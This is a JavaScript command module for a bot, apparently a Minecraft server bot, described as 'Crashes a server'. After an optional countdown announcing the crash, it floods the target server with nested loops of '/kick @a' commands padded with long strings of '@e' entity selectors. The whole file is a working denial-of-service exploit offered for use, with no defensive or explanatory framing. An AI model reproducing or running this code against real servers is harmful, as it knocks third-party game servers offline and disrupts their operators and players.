const index=require("../../index.js");
const cc=require("../commandblock.js");
module.exports={
	command:function(b,msg,sender,username){
		const args=msg.split(" ");
		if(sender!=="00000000-0000-0000-0000-Console00000" && args.length>=2){
			b.send("This command is not able to select a server, unless being run from console.")
			return;
		}
		let server;
		if(args.length>=2){
			server=+args[1];
		} else {
			server=0;
		}
		let delay;
		if(args[2]!=="silent"){
			delay=3000;
			setTimeout(()=>{
				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3")
				if(b.id!=server){
					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3")
				}
			},0)
			setTimeout(()=>{
				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2")
				if(b.id!=server){
					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2")
				}
			},1000)
			setTimeout(()=>{
				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1")
				if(b.id!=server){
					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1")
				}
			},2000)
		} else {
			delay=500;
		}
		setTimeout(()=>{
			for(let i=0;i<=cc.cs-1;i++){
				for(let j=0;j<=cc.cs-1;j++){
					for(let k=0;k<=cc.cs-1;k++){
						index.bots[server].send("/kick @a @e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e")
					}
				}
			}
		},delay)
	},
	desc: "Crashes a server",
	usage: " [server]"
}

